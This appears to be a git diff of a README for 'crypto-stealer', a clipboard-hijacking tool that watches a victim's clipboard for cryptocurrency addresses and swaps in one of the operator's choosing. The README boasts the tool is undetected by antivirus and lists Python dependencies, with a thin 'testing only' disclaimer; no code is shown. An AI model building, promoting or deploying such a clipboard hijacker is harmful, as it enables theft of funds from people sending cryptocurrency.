@@ -9,16 +9,20 @@ Use it ONLY for testing porpuses and improving security.
 ## Starting 🚀
 
 ### How it works:
-crypto-stealer checks the victim clipboard looking for crypto addresses. When it's found, replaces the original one with anything you want.
-
-As a victim, it's really hard to know if my address was changed.
+Crypto-stealer checks the victims clipboard looking for crypto addresses. When it's found, replaces the original one with anything you want.
 
 ### Detection:
-Crypto-stealer is UNDETECTED for any kind of antivirus/anti-malware.
+Crypto-stealer is **UNDETECTED** for any kind of antivirus/anti-malware.
 
 ### Requirements:
 ```
-pyperclip==1.8.0
+pyperclip
+time
+re
+ctypes
+os
+sys
+inspect
 ```
 
 ### Downloading:
